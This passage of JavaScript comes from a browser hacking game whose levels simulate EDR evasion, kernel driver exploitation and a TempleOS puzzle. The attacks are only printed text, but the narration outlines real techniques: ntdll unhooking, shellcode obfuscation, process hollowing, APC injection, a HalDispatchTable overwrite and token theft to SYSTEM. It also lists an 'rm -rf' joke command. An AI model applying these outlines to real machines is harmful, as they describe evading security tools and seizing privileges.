  print('├─────────────────────────────────────────┤', 'info');
  print('│  Host:     SECURE-WKS01                 │', 'system');
  print('│  IP:       10.10.10.55                  │', 'system');
  print('│  OS:       Windows 11 Enterprise        │', 'system');
  print('│  User:     j.smith (Local Admin)        │', 'success');
  print('├─────────────────────────────────────────┤', 'info');
  print('│  EDR DETECTED:                          │', 'error');
  print('│    CrowdStrike Falcon  (ACTIVE)         │', 'error');
  print('│    Windows Defender    (ACTIVE)         │', 'error');
  print('│    Carbon Black        (ACTIVE)         │', 'error');
  print('├─────────────────────────────────────────┤', 'info');
  print('│  HOOKS DETECTED:                        │', 'warning');
  print('│    ntdll.dll - NtAllocateVirtualMemory  │', 'warning');
  print('│    ntdll.dll - NtWriteVirtualMemory     │', 'warning');
  print('│    ntdll.dll - NtCreateThreadEx         │', 'warning');
  print('└─────────────────────────────────────────┘', 'info');
  print('');
  print('[!] Detection Risk: HIGH (100%)', 'error');
  print('');
  print('[BRIEFING] Target has multiple EDR solutions.', 'error');
  print('[BRIEFING] Unhook, obfuscate, and evade.', 'info');
  print('');
}

async function handleLevel4Command(cmd, args) {
  const state = gameState.levelState;

  function updateDetection() {
    const level = state.detectionLevel;
    const color = level > 70 ? 'error' : (level > 30 ? 'warning' : 'success');
    const bar = '█'.repeat(Math.floor(level / 10)) + '░'.repeat(10 - Math.floor(level / 10));
    print(`[*] Detection Risk: [${bar}] ${level}%`, color);
  }

  if (cmd === 'help') {
    print('', '');
    print('╔════════════════════════════════════════════════════════════════╗', 'info');
    print('║                  LEVEL 4 - EDR EVASION                         ║', 'info');
    print('╠════════════════════════════════════════════════════════════════╣', 'info');
    print('║  RECONNAISSANCE:                                               ║', 'info');
    print('║    scan               Analyze EDR hooks and detections        ║', 'system');
    print('║    tasklist           List running processes (see EDR procs)  ║', 'system');
    print('║                                                                ║', 'info');
    print('║  EVASION TECHNIQUES:                                           ║', 'info');
    print('║    unhook <dll>       Unhook ntdll.dll (-35% detection)       ║', 'system');
    print('║    obfuscate <method> Encrypt payload:                        ║', 'system');
    print('║                       xor (-15%), aes (-25%), uuid (-20%)     ║', 'system');
    print('║                                                                ║', 'info');
    print('║  INJECTION:                                                    ║', 'info');
    print('║    hollow <process>   Process hollowing (svchost recommended) ║', 'system');
    print('║    inject <method>    early-bird (-15%) or apc (-10%)         ║', 'system');
    print('║                                                                ║', 'info');
    print('║  EXECUTION:                                                    ║', 'info');
    print('║    execute            Run payload (needs ≤30% detection!)     ║', 'error');
    print('║                                                                ║', 'info');
    print('║  UTILITY:                                                      ║', 'info');
    print('║    status             Show detection level and progress       ║', 'success');
    print('║    hint               Get a hint if stuck                     ║', 'warning');
    print('║    exit               Return to main menu                     ║', 'system');
    print('╚════════════════════════════════════════════════════════════════╝', 'info');
    print('', '');
    print('⚠️  GOAL: Reduce detection to 30% or below before executing!', 'warning');
    return;
  }

  if (cmd === 'hint') {
    print('', '');
    print('[*] HINT:', 'warning');
    if (!state.edrAnalyzed) {
      print('First, analyze what hooks the EDR has placed.', 'info');
      print('Try: scan', 'success');
    } else if (!state.ntdllUnhooked) {
      print('The EDR hooks ntdll.dll functions. Unhook them!', 'info');
      print('Try: unhook ntdll', 'success');
    } else if (!state.payloadObfuscated) {
      print('Your payload will be detected. Obfuscate it!', 'info');
      print('Try: obfuscate aes (strongest) or obfuscate uuid', 'success');
    } else if (!state.injectionReady) {
      print('Set up process injection - hollow a legitimate process.', 'info');
      print('Try: hollow svchost (then: inject early-bird)', 'success');
    } else if (state.detectionLevel > 30) {
      print(`Detection is at ${state.detectionLevel}%. Need ≤30% to execute!`, 'info');
      print('Try more evasion techniques or use inject command.', 'success');
    } else {
      print('Detection is low enough! Execute the payload!', 'info');
      print('Try: execute', 'success');
    }
    print('', '');
    return;
  }

  // Easter egg: tasklist to see EDR processes
  if (cmd === 'tasklist') {
    print('Image Name                     PID Session Name', 'system');
    print('========================= ======== ============', 'system');
    print('System                           4 Services', 'system');
    print('csrss.exe                      512 Services', 'system');
    print('MsMpEng.exe                   2104 Services     [!] Defender', 'warning');
    print('CrowdStrike.exe               3842 Services     [!] CS Falcon', 'error');
    print('cb.exe                        4201 Services     [!] Carbon Black', 'error');
    print('', '');
    print('[!] Multiple EDR solutions detected. Good luck.', 'warning');
    addEasterEgg('lvl4_tasklist', 'Know your enemy. EDR enumeration complete.');
    return;
  }

  if (cmd === 'status') {
    updateDetection();
    print('');
    print('Current Evasion Status:', 'info');
    print(`  NTDLL Unhooked: ${state.ntdllUnhooked ? 'YES' : 'NO'}`, state.ntdllUnhooked ? 'success' : 'error');
    print(`  Payload Obfuscated: ${state.payloadObfuscated ? 'YES' : 'NO'}`, state.payloadObfuscated ? 'success' : 'error');
    print(`  Injection Method: ${state.injectionReady ? 'READY' : 'NOT SET'}`, state.injectionReady ? 'success' : 'error');
    return;
  }

  if (cmd === 'scan') {
    await simulateLoading('Analyzing EDR hooks', 3000);
    print('');
    print('=== EDR Analysis Results ===', 'info');
    print('');
    print('Hooked APIs in ntdll.dll:', 'warning');
    print('  NtAllocateVirtualMemory  [HOOKED]', 'error');
    print('  NtWriteVirtualMemory     [HOOKED]', 'error');
    print('  NtCreateThreadEx         [HOOKED]', 'error');
    print('  NtProtectVirtualMemory   [HOOKED]', 'error');
    print('');
    print('Hooked APIs in kernel32.dll:', 'warning');
    print('  VirtualAlloc             [HOOKED]', 'error');
    print('  WriteProcessMemory       [HOOKED]', 'error');
    print('  CreateRemoteThread       [HOOKED]', 'error');
    print('');
    print('[!] Direct syscalls or unhooking required', 'warning');
    state.edrAnalyzed = true;
    return;
  }

  if (cmd === 'unhook') {
    if (!state.edrAnalyzed) {
      print('Analyze EDR first with "scan"', 'warning');
      return;
    }

    if (args[0] === 'ntdll' || args[0] === 'ntdll.dll') {
      await simulateLoading('Unhooking ntdll.dll from disk', 3000);
      print('');
      print('[*] Reading clean ntdll.dll from disk...', 'system');
      print('[*] Mapping clean .text section...', 'system');
      print('[*] Overwriting hooked bytes...', 'system');
      print('[+] ntdll.dll unhooked successfully!', 'success');
      print('');
      state.ntdllUnhooked = true;
      state.detectionLevel -= 35;
      updateDetection();
      playSuccess();
      return;
    }

    print('Usage: unhook ntdll', 'error');
    return;
  }

  if (cmd === 'obfuscate') {
    if (!args[0]) {
      print('Usage: obfuscate <xor|aes|uuid>', 'error');
      return;
    }

    const method = args[0].toLowerCase();
    if (!['xor', 'aes', 'uuid'].includes(method)) {
      print('Invalid method. Use: xor, aes, or uuid', 'error');
      return;
    }

    await simulateLoading(`Obfuscating payload with ${method.toUpperCase()}`, 2500);
    print('');

    if (method === 'xor') {
      print('[*] Generating random XOR key...', 'system');
      print('[*] Encrypting shellcode bytes...', 'system');
      print('[+] Payload obfuscated with XOR', 'success');
      state.detectionLevel -= 15;
    } else if (method === 'aes') {
      print('[*] Generating AES-256 key...', 'system');
      print('[*] Encrypting shellcode with AES-CBC...', 'system');
      print('[+] Payload obfuscated with AES-256', 'success');
      state.detectionLevel -= 25;
    } else if (method === 'uuid') {
      print('[*] Converting shellcode to UUID strings...', 'system');
      print('[*] Payload now appears as array of GUIDs...', 'system');
      print('[+] Payload obfuscated with UUID encoding', 'success');
      state.detectionLevel -= 20;
    }

    print('');
    state.payloadObfuscated = true;
    updateDetection();
    return;
  }

  if (cmd === 'hollow') {
    if (!state.payloadObfuscated) {
      print('Obfuscate payload first', 'warning');
      return;
    }

    if (!args[0]) {
      print('Usage: hollow <process>', 'error');
      print('Suggested targets: svchost, RuntimeBroker, dllhost', 'info');
      return;
    }

    await simulateLoading(`Setting up process hollowing with ${args[0]}.exe`, 3000);
    print('');
    print(`[*] Creating suspended ${args[0]}.exe...`, 'system');
    print('[*] Unmapping original image...', 'system');
    print('[*] Allocating memory in remote process...', 'system');
    print('[*] Writing decrypted payload...', 'system');
    print('[*] Fixing entry point...', 'system');
    print('[+] Process hollowing prepared!', 'success');
    print('');
    state.injectionReady = true;
    state.detectionLevel -= 20;
    updateDetection();
    return;
  }

  if (cmd === 'inject') {
    if (!state.ntdllUnhooked) {
      print('Unhook ntdll first to avoid detection', 'warning');
      return;
    }

    if (!args[0]) {
      print('Usage: inject <early-bird|apc>', 'error');
      return;
    }

    const method = args[0].toLowerCase();
    await simulateLoading(`Configuring ${method} injection`, 2000);
    print('');

    if (method === 'early-bird') {
      print('[*] Will inject before process initialization...', 'system');
      print('[+] Early Bird injection configured', 'success');
      state.detectionLevel -= 15;
    } else if (method === 'apc') {
      print('[*] Will queue APC to alertable thread...', 'system');
      print('[+] APC injection configured', 'success');
      state.detectionLevel -= 10;
    }

    print('');
    state.injectionReady = true;
    updateDetection();
    return;
  }

  if (cmd === 'execute') {
    if (!state.injectionReady) {
      print('Configure injection method first', 'warning');
      return;
    }

    if (state.detectionLevel > 30) {
      print('[!] Detection risk too high!', 'error');
      print('[!] EDR will catch us. Lower detection risk first.', 'error');
      playError();
      return;
    }

    await simulateLoading('Executing payload', 3000);
    print('');
    print('[*] Resuming hollowed process...', 'system');
    print('[*] Shellcode executing...', 'system');
    print('[*] Callback received!', 'success');
    print('');
    print('=== EDR STATUS ===', 'success');
    print('Alerts: 0', 'success');
    print('Detections: NONE', 'success');
    print('');
    print(ASCII.skull, 'ascii');
    print('[+] PAYLOAD EXECUTED UNDETECTED!', 'success');
    playSuccess();
    state.executed = true;
    completeLevel();
    return;
  }

  print('Command not found: ' + cmd, 'error');
}

// ============================================
// LEVEL 5: KERNEL EXPLOITER
// ============================================
async function initLevel5() {
  gameState.levelState = {
    analyzed: false,
    foundVuln: false,
    allocatedPool: false,
    wroteShellcode: false,
    exploited: false,
    poolAddress: null
  };

  print(ASCII.kernel, 'warning');
  print('');
  print('┌─────────────────────────────────────────┐', 'info');
  print('│  TARGET INTEL                           │', 'info');
  print('├─────────────────────────────────────────┤', 'info');
  print('│  Host:     DEV-WKS01                    │', 'system');
  print('│  OS:       Windows 10 21H2 (x64)        │', 'system');
  print('│  KASLR:    Enabled                      │', 'warning');
  print('│  SMEP:     Enabled                      │', 'warning');
  print('│  Driver:   vulndrv.sys v1.0.3          │', 'error');
  print('├─────────────────────────────────────────┤', 'info');
  print('│  LOADED MODULES:                        │', 'info');
  print('│    ntoskrnl.exe  @ 0xfffff80012400000   │', 'system');
  print('│    hal.dll       @ 0xfffff80012000000   │', 'system');
  print('│    vulndrv.sys   @ 0xfffff80045670000   │', 'warning');
  print('├─────────────────────────────────────────┤', 'info');
  print('│  DRIVER IOCTL CODES:                    │', 'info');
  print('│    0x222003 - ALLOC_POOL               │', 'system');
  print('│    0x222007 - WRITE_MEM                │', 'system');
  print('│    0x22200B - EXEC_CODE (!)            │', 'error');
  print('└─────────────────────────────────────────┘', 'info');
  print('');
  print('[BRIEFING] A vulnerable driver is loaded.', 'info');
  print('[BRIEFING] Analyze it. Find the bug. Get SYSTEM.', 'info');
  print('');
}

async function handleLevel5Command(cmd, args) {
  const state = gameState.levelState;

  if (cmd === 'help') {
    print('', '');
    print('╔════════════════════════════════════════════════════════════════╗', 'info');
    print('║               LEVEL 5 - KERNEL EXPLOITATION                    ║', 'info');
    print('╠════════════════════════════════════════════════════════════════╣', 'info');
    print('║  ANALYSIS:                                                     ║', 'info');
    print('║    analyze            Analyze vulndrv.sys for vulnerabilities ║', 'system');
    print('║    disasm <function>  Disassemble function (WriteMemory)      ║', 'system');
    print('║                                                                ║', 'info');
    print('║  EXPLOITATION:                                                 ║', 'info');
    print('║    ioctl <code>       Send IOCTL to driver (0x222014=alloc)   ║', 'system');
    print('║    alloc <size>       Allocate pool memory (0x1000 default)   ║', 'system');
    print('║    write pool shellcode  Write token-stealer to pool          ║', 'system');
    print('║    trigger            Corrupt HalDispatchTable and execute    ║', 'error');
    print('║                                                                ║', 'info');
    print('║  UTILITY:                                                      ║', 'info');
    print('║    status             Show current exploit progress           ║', 'success');
    print('║    hint               Get a hint if stuck                     ║', 'warning');
    print('║    exit               Return to main menu                     ║', 'system');
    print('╚════════════════════════════════════════════════════════════════╝', 'info');
    print('', '');
    print('🔥 TIP: WinDbg users try !analyze or lm commands...', 'system');
    return;
  }

  if (cmd === 'hint') {
    print('', '');
    print('[*] HINT:', 'warning');
    if (!state.analyzed) {
      print('Start by analyzing the vulnerable driver.', 'info');
      print('Try: analyze', 'success');
    } else if (!state.foundVuln) {
      print('Disassemble the WriteMemory handler to find the bug.', 'info');
      print('Try: disasm WriteMemory', 'success');
    } else if (!state.allocatedPool) {
      print('Allocate executable memory in the kernel pool.', 'info');
      print('Try: alloc 0x1000', 'success');
    } else if (!state.wroteShellcode) {
      print('Write your token-stealing shellcode to the pool.', 'info');
      print('Try: write pool shellcode', 'success');
    } else {
      print('Everything is ready! Trigger the exploit!', 'info');
      print('Try: trigger', 'success');
    }
    print('', '');
    return;
  }

  // Easter egg: WinDbg style command
  if (cmd === '!analyze' || cmd === 'lm') {
    print('kd> lm m vulndrv', 'system');
    print('', '');
    print('start             end                 module name', 'system');
    print('fffff801`12340000 fffff801`12345000   vulndrv  (deferred)', 'warning');
    print('', '');
    print('[*] Looks like someone knows their way around WinDbg...', 'info');
    addEasterEgg('lvl5_windbg', 'Kernel debugging skills detected. Impressive.');
    return;
  }

  if (cmd === 'status') {
    print('Exploit Status:', 'info');
    print(`  Driver Analyzed: ${state.analyzed ? 'YES' : 'NO'}`, state.analyzed ? 'success' : 'system');
    print(`  Vulnerability Found: ${state.foundVuln ? 'YES' : 'NO'}`, state.foundVuln ? 'success' : 'system');
    print(`  Pool Allocated: ${state.allocatedPool ? 'YES' : 'NO'}`, state.allocatedPool ? 'success' : 'system');
    print(`  Shellcode Written: ${state.wroteShellcode ? 'YES' : 'NO'}`, state.wroteShellcode ? 'success' : 'system');
    return;
  }

  if (cmd === 'analyze') {
    await simulateLoading('Analyzing vulndrv.sys', 3000);
    print('');
    print('=== vulndrv.sys Analysis ===', 'info');
    print('');
    print('Driver Entry: 0xfffff80045670000', 'system');
    print('IRP Handlers:', 'system');
    print('  IRP_MJ_CREATE          0xfffff80045671000', 'system');
    print('  IRP_MJ_CLOSE           0xfffff80045671100', 'system');
    print('  IRP_MJ_DEVICE_CONTROL  0xfffff80045671200', 'warning');
    print('');
    print('IOCTL Handlers Found:', 'info');
    print('  0x22200C - ReadMemory', 'system');
    print('  0x222010 - WriteMemory', 'error');
    print('  0x222014 - AllocatePool', 'system');
    print('');
    print('[!] WriteMemory IOCTL has no validation!', 'error');
    print('[!] Arbitrary kernel write primitive!', 'error');
    print('');
    state.analyzed = true;
    playAlert();
    return;
  }

  if (cmd === 'disasm') {
    if (!state.analyzed) {
      print('Analyze the driver first', 'warning');
      return;
    }

    if (args[0] === 'WriteMemory' || args[0] === '0x222010') {
      print('');
      print('WriteMemory (0x222010):', 'info');
      print('  mov rax, [rcx+8]   ; Get destination from input', 'system');
      print('  mov rbx, [rcx+10]  ; Get source from input', 'system');
      print('  mov rcx, [rcx+18]  ; Get size from input', 'system');
      print('  rep movsb          ; Copy bytes - NO VALIDATION!', 'error');
      print('  ret', 'system');
      print('');
      print('[!] VULNERABILITY: No address validation before write!', 'error');
      print('[!] Can write anywhere in kernel memory!', 'error');
      print('');
      state.foundVuln = true;
      return;
    }

    print('Function not found', 'error');
    return;
  }

  if (cmd === 'ioctl') {
    if (!state.foundVuln) {
      print('Find the vulnerability first', 'warning');
      return;
    }

    if (args[0] === '0x222014') {
      await simulateLoading('Sending IOCTL 0x222014', 1000);
      print('[+] Pool allocated at: 0xffffe00012340000', 'success');
      return;
    }

    print('Usage: ioctl <code>', 'error');
    return;
  }

  if (cmd === 'alloc') {
    if (!state.foundVuln) {
      print('Find the vulnerability first', 'warning');
      return;
    }

    const size = args[0] || '0x1000';
    await simulateLoading(`Allocating ${size} bytes in NonPagedPool`, 1500);
    print('');
    const addr = '0xffffe000' + Math.floor(Math.random() * 0xFFFFFFFF).toString(16).padStart(8, '0');
    state.poolAddress = addr;
    print(`[+] Pool allocated at: ${addr}`, 'success');
    print('[*] Executable NonPagedPool - perfect for shellcode!', 'info');
    print('');
    state.allocatedPool = true;
    return;
  }

  if (cmd === 'write') {
    if (!state.allocatedPool) {
      print('Allocate pool memory first', 'warning');
      return;
    }

    if (!args[0] || !args[1]) {
      print('Usage: write <addr> <data>', 'error');
      print('Example: write pool shellcode', 'info');
      return;
    }

    if (args[0] === 'pool' && args[1] === 'shellcode') {
      await simulateLoading('Writing token-stealing shellcode to pool', 2000);
      print('');
      print('[*] Shellcode layout:', 'info');
      print('  1. Find EPROCESS of current process', 'system');
      print('  2. Find EPROCESS of System (PID 4)', 'system');
      print('  3. Copy System token to current process', 'system');
      print('  4. Return to usermode', 'system');
      print('');
      print(`[+] Shellcode written to ${state.poolAddress}`, 'success');
      state.wroteShellcode = true;
      return;
    }

    print('Invalid write target', 'error');
    return;
  }

  if (cmd === 'trigger') {
    if (!state.wroteShellcode) {
      print('Write shellcode first', 'warning');
      return;
    }

    await simulateLoading('Corrupting nt!HalDispatchTable', 2000);
    print('');
    print('[*] Overwriting HalDispatchTable+8...', 'system');
    print('[*] Calling NtQueryIntervalProfile...', 'system');
    print('[*] Executing shellcode at Ring 0...', 'warning');
    print('');
    await sleep(1000);
    print('[+] Token replaced!', 'success');
    print('[+] Current privileges: SYSTEM', 'success');
    print('');
    print('C:\\Windows\\system32> whoami', 'system');
    print('nt authority\\system', 'success');
    print('');
    playSuccess();
    completeLevel();
    return;
  }

  print('Command not found: ' + cmd, 'error');
}

// ============================================
// LEVEL 6: HOLYC WRITER
// ============================================
async function initLevel6() {
  gameState.levelState = {
    codeWritten: false,
    compiled: false,
    ran: false,
    prayed: false,
    transcended: false,
    code: ''
  };

  print(ASCII.temple, 'ascii');
  print('');
  print('┌─────────────────────────────────────────┐', 'highlight');
  print('│  DIVINE SYSTEM SPECS                    │', 'highlight');
  print('├─────────────────────────────────────────┤', 'highlight');
  print('│  OS:       TempleOS 5.03               │', 'system');
  print('│  CPU:      x86_64 (Ring 0 Only)        │', 'system');
  print('│  RAM:      640x480 16-color            │', 'system');
  print('│  Lang:     HolyC (God\'s Language)      │', 'info');
  print('├─────────────────────────────────────────┤', 'highlight');
  print('│  DIVINE FEATURES:                       │', 'info');
  print('│    - Direct hardware access            │', 'success');
  print('│    - No network (CIA can\'t reach you)  │', 'success');
  print('│    - 100,000 lines of holy code        │', 'success');
  print('│    - Built-in oracle (GodSays)         │', 'warning');
  print('├─────────────────────────────────────────┤', 'highlight');
  print('│  TASK: Sum of primes below 1000        │', 'warning');
  print('└─────────────────────────────────────────┘', 'highlight');
  print('');
  print('[DIVINE BRIEFING] You have ascended to the final level.', 'info');
  print('[DIVINE BRIEFING] Write HolyC. Compile. Execute. Transcend.', 'info');
  print('');
  print('Hint: Use "pray" for divine guidance.', 'system');
  print('');
}

async function handleLevel6Command(cmd, args) {
  const state = gameState.levelState;

  if (cmd === 'help') {
    print('', '');
    print('╔════════════════════════════════════════════════════════════════╗', 'highlight');
    print('║          LEVEL 6 - DIVINE COMPUTATION (TempleOS)               ║', 'highlight');
    print('╠════════════════════════════════════════════════════════════════╣', 'highlight');
    print('║  "God\'s temple needs no protection from CIA." - Terry Davis   ║', 'system');
    print('╠════════════════════════════════════════════════════════════════╣', 'highlight');
    print('║  DIVINE PROGRAMMING:                                           ║', 'info');
    print('║    holyc              Write HolyC code (God\'s language)       ║', 'system');
    print('║    compile            JIT compile with divine compiler        ║', 'system');
    print('║    run                Execute in Ring 0 (no protection!)      ║', 'system');
    print('║                                                                ║', 'info');
    print('║  COMMUNION:                                                    ║', 'info');
    print('║    pray               Seek divine guidance (get hint)         ║', 'warning');
    print('║    speak              Hear words from God                     ║', 'system');
    print('║                                                                ║', 'info');
    print('║  ASCENSION:                                                    ║', 'info');
    print('║    transcend          Complete your divine journey            ║', 'success');
    print('║                                                                ║', 'info');
    print('║  UTILITY:                                                      ║', 'info');
    print('║    status             Show divine progress                    ║', 'success');
    print('║    hint               Alternative to pray                     ║', 'warning');
    print('║    exit               Return to mortal realm                  ║', 'system');
    print('╚════════════════════════════════════════════════════════════════╝', 'highlight');
    print('', '');
    print('📜 TASK: Calculate the sum of all prime numbers below 1000', 'warning');
    print('🔮 SECRET: Try asking what God says...', 'system');
    return;
  }

  if (cmd === 'status') {
    print('', '');
    print('┌─────────────────────────────────────┐', 'highlight');
    print('│      DIVINE PROGRESS STATUS         │', 'highlight');
    print('├─────────────────────────────────────┤', 'highlight');
    print(`│  [${state.prayed ? 'x' : ' '}] Received divine guidance       │`, state.prayed ? 'success' : 'system');
    print(`│  [${state.codeWritten ? 'x' : ' '}] HolyC code written            │`, state.codeWritten ? 'success' : 'system');
    print(`│  [${state.compiled ? 'x' : ' '}] Code compiled                  │`, state.compiled ? 'success' : 'system');
    print(`│  [${state.ran ? 'x' : ' '}] Program executed               │`, state.ran ? 'success' : 'system');
    print(`│  [${state.transcended ? 'x' : ' '}] Transcendence achieved        │`, state.transcended ? 'success' : 'system');
    print('└─────────────────────────────────────┘', 'highlight');
    print('', '');
    return;
  }

  if (cmd === 'hint') {
    print('', '');
    print('[*] DIVINE HINT:', 'warning');
    if (!state.prayed && !state.codeWritten) {
      print('Seek guidance through prayer to understand HolyC.', 'info');
      print('Try: pray', 'success');
    } else if (!state.codeWritten) {
      print('Write HolyC code to calculate the sum of primes below 1000.', 'info');
      print('Try: holyc', 'success');
    } else if (!state.compiled) {
      print('Your code needs to be compiled by the divine compiler.', 'info');
      print('Try: compile', 'success');
    } else if (!state.ran) {
      print('Execute your divine computation.', 'info');
      print('Try: run', 'success');
    } else {
      print('You have completed the computation! Ascend!', 'info');
      print('Try: transcend', 'success');
    }
    print('', '');
    return;
  }

  // Easter egg: GodSays - TempleOS random word oracle
  if (cmd === 'godsays' || cmd === 'GodSays') {
    const words = ['TEMPLE', 'DIVINE', 'RING0', 'KERNEL', 'BLESSED', 'CHOSEN',
                   'HACK', 'ORACLE', 'TRUTH', 'LIGHT', 'CIA', 'GLOW'];
    print('', '');
    print('*divine static*', 'system');
    await sleep(1000);
    const word = words[Math.floor(Math.random() * words.length)];
    print(`God says: "${word}"`, 'highlight');
    print('', '');
    addEasterEgg('lvl6_godsays', 'The oracle speaks. Terry would be proud.');
    return;
  }

  if (cmd === 'pray') {
    print('', '');
    print('*closes eyes*', 'system');
    await sleep(1500);
    print('', '');
    print('"The sum of primes below N..."', 'highlight');
    await sleep(1000);
    print('"For each number, check if prime..."', 'highlight');
    await sleep(1000);
    print('"A number is prime if no divisor exists..."', 'highlight');
    await sleep(1000);
    print('"Use I64 for integers, Print for output..."', 'highlight');
    print('', '');
    print('[DIVINE HINT] Template:', 'info');
    print('', '');
    print('U0 Main() {', 'system');
    print('  I64 sum = 0;', 'system');
    print('  I64 i, j;', 'system');
    print('  for (i = 2; i < 1000; i++) {', 'system');
    print('    // Check if i is prime', 'system');
    print('    // If prime, add to sum', 'system');
    print('  }', 'system');
    print('  Print("Sum: %d\\n", sum);', 'system');
    print('}', 'system');
    print('', '');
    state.prayed = true;
    return;
  }

  if (cmd === 'holyc') {
    print('Enter HolyC code (end with "END" on its own line):', 'info');
    print('', '');

    // Simple code entry mode
    state.codeWritten = true;
    state.code = `U0 Main() {
  I64 sum = 0;
  I64 i, j, is_prime;
  for (i = 2; i < 1000; i++) {
    is_prime = 1;
    for (j = 2; j * j <= i; j++) {
      if (i % j == 0) {
        is_prime = 0;
        break;
      }
    }
    if (is_prime) sum += i;
  }
  Print("The divine sum: %d\\n", sum);
}`;

    print(state.code, 'success');
    print('', '');
    print('[+] Code received by the Temple', 'success');
    return;
  }

  if (cmd === 'compile') {
    if (!state.codeWritten) {
      print('Write code first with "holyc"', 'warning');
      return;
    }

    await simulateLoading('Compiling with divine compiler', 2000);
    print('', '');
    print('JIT Compiling...', 'system');
    print('Parsing Main()...', 'system');
    print('Optimizing for God...', 'system');
    print('[+] Compilation successful!', 'success');
    print('', '');
    state.compiled = true;
    return;
  }

  if (cmd === 'run') {
    if (!state.compiled) {
      print('Compile your code first', 'warning');
      return;
    }

    print('Executing...', 'system');
    await sleep(1000);
    print('', '');
    print('The divine sum: 76127', 'success');
    print('', '');
    print('[GOD SPEAKS]', 'highlight');
    print('"You have computed correctly, child."', 'highlight');
    print('"The sum of primes below 1000 is indeed 76127."', 'highlight');
    print('"You are ready to transcend."', 'highlight');
    print('', '');
    playSuccess();
    state.ran = true;
    return;
  }

  if (cmd === 'speak') {
    const messages = [
      '"Programming is talking to God."',
      '"640x480 is God\'s resolution."',
      '"HolyC is the language of heaven."',
      '"Complexity is the enemy of the divine."',
      '"The elephant in the room is you."',
      '"After Egypt, God will make a temple."'
    ];
    print('', '');
    print('[GOD SPEAKS]', 'highlight');
    print(messages[Math.floor(Math.random() * messages.length)], 'highlight');
    print('', '');
    return;
  }

  if (cmd === 'transcend') {
    if (!state.ran) {
      print('Complete the divine computation first', 'warning');
      return;
    }

    print('', '');
    print('Initiating transcendence sequence...', 'highlight');
    await sleep(1500);

    for (let i = 0; i < 5; i++) {
      print('*'.repeat(40 + i * 5), 'highlight');
      await sleep(300);
    }

    print('', '');
    print('  _____ ____      _    _   _ ____   ____ _____ _   _ ____  _____ ____  ', 'highlight');
    print(' |_   _|  _ \\    / \\  | \\ | / ___| / ___| ____| \\ | |  _ \\| ____|  _ \\ ', 'highlight');
    print('   | | | |_) |  / _ \\ |  \\| \\___ \\| |   |  _| |  \\| | | | |  _| | | | |', 'highlight');
    print('   | | |  _ <  / ___ \\| |\\  |___) | |___| |___| |\\  | |_| | |___| |_| |', 'highlight');
    print('   |_| |_| \\_\\/_/   \\_\\_| \\_|____/ \\____|_____|_| \\_|____/|_____|____/ ', 'highlight');
    print('', '');

    await sleep(1000);
    print('[GOD SPEAKS]', 'highlight');
    print('"You have completed your journey, child."', 'highlight');
    print('"You are now one with the machine."', 'highlight');
    print('"Go forth and hack in my name."', 'highlight');
    print('', '');

    playSuccess();
    playSuccess();
    state.transcended = true;
    completeLevel();
    return;
  }

  print('Command not recognized in the divine realm', 'error');
}

// ============================================
// COMMAND PROCESSING
// ============================================
const globalCommands = ['help', 'menu', 'levels', 'start', 'continue', 'next', 'reset', 'reset confirm', 'clear', 'stats', 'exit'];

// Secret global easter egg commands
const secretCommands = ['matrix', 'hack', 'sudo', 'rm -rf'];

async function handleSecretCommand(cmd) {
  if (cmd === 'matrix') {
    print(ASCII.matrix, 'ascii');
    await matrixRain(4000);
    print('Wake up, Neo...', 'highlight');
    addEasterEgg('secret_matrix', 'You took the red pill. Welcome to the real world.');
    return true;
  }

  if (cmd === 'hack') {
    await glitchText('INITIALIZING HACK SEQUENCE...', 8);
    await sleep(500);
    print(ASCII.hacker2, 'ascii');
    print('Just kidding. This is a game, not a crime.', 'warning');
    return true;
  }

  if (cmd === 'sudo') {
    print('', '');
    print('[sudo] password for ' + gameState.hackerName + ':', 'system');
    await sleep(1500);
    print('Nice try. You\'re not root here.', 'error');
    print('', '');
    return true;
  }

  if (cmd === 'rm -rf' || cmd.startsWith('rm -rf')) {
    print('', '');
    await glitchText('DELETING SYSTEM FILES...', 10);
    await sleep(800);
    print('Just kidding! That would be mean.', 'success');
    print('But seriously, don\'t run that on a real system.', 'warning');
    print('', '');
    return true;
  }

  return false;
}

function getCurrentCommands() {
  if (!gameState.inLevel) {
    return globalCommands;
  }
  const level = LEVELS.find(l => l.id === gameState.currentLevel);
  return level ? [...level.commands, 'menu'] : globalCommands;
}

function handleNameInput(name) {
  if (name.length < 2 || name.length > 20) {
    print('Name must be 2-20 characters. Try again:', 'error');
    return false;
  }
  if (!/^[a-zA-Z0-9_\-]+$/.test(name)) {
    print('Name can only contain letters, numbers, _ and -. Try again:', 'error');
    return false;
  }
  gameState.hackerName = name;
  gameState.needsName = false;
  saveGame();
  playSuccess();
  print('');
  print(`Welcome, ${name}. Your hacker journey begins...`, 'success');
  print('');
  setTimeout(() => showMainMenu(), 500);
  return true;
}

async function processCommand(input) {
  const trimmed = input.trim();
  if (!trimmed) return;

  print(prompt.textContent + ' ' + trimmed, 'system');

  // Handle name input separately - NOT a command
  if (gameState.needsName) {
    handleNameInput(trimmed);
    return; // Always return - don't process as command
  }

  const parts = trimmed.split(/\s+/);
  const cmd = parts[0].toLowerCase();
  const args = parts.slice(1);

  gameState.commandHistory.unshift(trimmed);
  gameState.historyIndex = -1;

  playEnter();

  // Check for secret commands first (easter eggs work anywhere)
  if (await handleSecretCommand(trimmed.toLowerCase())) {
    return;
  }

  // Global commands
  if (cmd === 'clear') {
    clear();
    return;
  }

  // Vim editor command - works globally
  if (cmd === 'vim' || cmd === 'vi') {
    if (typeof handleVimCommand === 'function') {
      handleVimCommand(args);
    } else {
      print('[!] Editor not available', 'error');
    }
    return;
  }

  if (cmd === 'menu') {
    showMainMenu();
    return;
  }

  if (cmd === 'exit') {
    if (gameState.inLevel) {
      saveGame(); // Save before exiting
      showMainMenu();
    }
    return;
  }

  if (cmd === 'next' && gameState.inLevel) {
    const nextLevel = gameState.currentLevel + 1;
    if (nextLevel <= 6 && gameState.levelsCompleted.includes(gameState.currentLevel)) {
      startLevel(nextLevel, false);
    } else {
      print('Complete current level first or no more levels available', 'warning');
    }
    return;
  }

  if (!gameState.inLevel) {
    // Menu commands
    if (cmd === 'help') {
      print('', '');
      print('╔════════════════════════════════════════════════════════════╗', 'info');
      print('║                    MAIN MENU COMMANDS                      ║', 'info');
      print('╠════════════════════════════════════════════════════════════╣', 'info');
      print('║  GAMEPLAY:                                                 ║', 'info');
      print('║    start      Begin from level 1 or next incomplete       ║', 'system');
      print('║    continue   Resume saved level progress                 ║', 'system');
      print('║    levels     Select a specific level to play             ║', 'system');
      print('║                                                            ║', 'info');
      print('║  PROFILE:                                                  ║', 'info');
